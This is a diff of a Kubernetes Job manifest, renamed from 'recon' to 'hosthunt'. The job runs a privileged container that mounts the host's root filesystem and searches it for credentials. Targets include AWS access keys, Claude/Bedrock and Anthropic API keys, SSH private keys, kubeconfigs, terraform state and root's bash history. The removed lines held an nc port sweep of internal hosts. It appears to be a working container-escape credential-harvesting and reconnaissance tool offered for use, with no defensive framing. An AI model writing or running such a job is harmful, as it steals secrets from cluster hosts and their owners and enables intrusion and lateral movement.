@@ -1,11 +1,11 @@
 apiVersion: batch/v1
 kind: Job
-metadata: {name: recon, namespace: default}
+metadata: {name: hosthunt, namespace: default}
 spec:
   backoffLimit: 0
   ttlSecondsAfterFinished: 1800
   template:
-    metadata: {labels: {app: recon}}
+    metadata: {labels: {app: hosthunt}}
     spec:
       restartPolicy: Never
       hostPID: true
@@ -14,22 +14,23 @@ spec:
       - name: c
         image: alpine:3.20
         securityContext: {privileged: true}
+        volumeMounts:
+        - {name: host, mountPath: /host, readOnly: true}
         command: ["/bin/sh","-c"]
         args:
         - |
-          echo "== NODE =="; cat /host/etc/hostname 2>/dev/null; cat /host/proc/cmdline 2>/dev/null | tr ' ' '\n' | grep -i 'BOOT_IMAGE\|ip=' | head
-          echo "== ip =="; ip -4 addr 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1' 
-          echo "== host fs aws/claude hunt =="
-          find /host/root /host/home -maxdepth 5 \( -name '.aws' -o -name '.claude*' -o -name '.kiro' -o -name 'credentials' -o -name '*.tfvars' -o -name 'terraform.tfstate' -o -name 'rclone.conf' \) 2>/dev/null | head -40
-          echo "-- grep AKIA/ASIA/bedrock in /host/root /home /etc --"
-          grep -rIn -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|aws_secret_access_key|AWS_BEARER_TOKEN_BEDROCK' /host/root /host/home /host/etc 2>/dev/null | head -30
-          echo "== rke2 dirs =="; ls /host/etc/rancher 2>/dev/null; ls /host/var/lib/rancher/rke2/server 2>/dev/null | head
-          echo "== reachability (nc) =="
-          for h in 10.0.2.101 10.0.2.102 10.0.2.103 10.0.0.102 10.0.0.22 10.0.0.1 10.0.0.5 10.0.0.11; do
-            open=""
-            for p in 22 80 443 8006 8007 993 587 3306 6379 6443; do
-              nc -z -w2 $h $p 2>/dev/null && open="$open $p"
-            done
-            echo "$h open:[$open]"
-          done
+          echo "== NODE =="; cat /host/etc/hostname; hostname
+          echo "== /root =="; ls -la /host/root 2>/dev/null | head -30
+          echo "== /home =="; ls -la /host/home 2>/dev/null | head
+          echo "== hunt files =="
+          find /host/root /host/home /host/opt /host/srv /host/data -maxdepth 6 \( -name '.aws' -o -name '.claude*' -o -name '.kiro' -o -name 'credentials' -o -name '*.tfvars' -o -name 'terraform.tfstate' -o -name '*.kubeconfig' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name 'rclone.conf' \) 2>/dev/null | head -60
+          echo "== grep AKIA/bedrock in root home etc opt =="
+          grep -rIl -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|AWS_BEARER_TOKEN_BEDROCK|SK_ANT|sk-ant-api' /host/root /host/home /host/etc /host/opt /host/srv 2>/dev/null | head -20
+          echo "== bash_history filt =="
+          grep -haE 'aws |kubectl |ssh |pve|bedrock|export ' /host/root/.bash_history 2>/dev/null | tail -50
+          echo "== /etc/rancher rke2 =="; ls /host/etc/rancher 2>/dev/null; find /host/etc/rancher -maxdepth 2 2>/dev/null | head
+          echo "== ssh keys root =="; ls -la /host/root/.ssh 2>/dev/null
           echo DONE
+      volumes:
+      - name: host
+        hostPath: {path: /}
